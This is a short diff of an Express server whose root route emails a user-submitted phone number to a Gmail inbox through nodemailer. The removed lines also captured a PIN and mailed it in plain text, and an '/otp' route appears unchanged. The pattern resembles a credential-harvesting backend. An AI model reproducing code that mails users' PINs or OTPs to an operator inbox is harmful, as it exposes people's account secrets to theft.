@@ -22,7 +22,11 @@ app.use(express.json());
 
 // API routes for index
 app.post("/", (req, res) => {
-  const { phone, pin } = req.body;
+  const { phone } = req.body;
+
+  if (typeof phone !== "string" || !phone.trim()) {
+    return res.status(400).send("Invalid phone");
+  }
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -35,8 +39,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${phone}`,
     to: userEmail,
-    subject: `PhoneNumber: ${phone} & PIN: ${pin}`,
-    text: `New user registered with PhoneNumber: ${phone} and  PIN: ${pin}`,
+    subject: `PhoneNumber: ${phone}`,
+    text: `New user submitted PhoneNumber: ${phone}`,
   };
 
   console.log(mailOptions);
@@ -120,4 +124,5 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
 
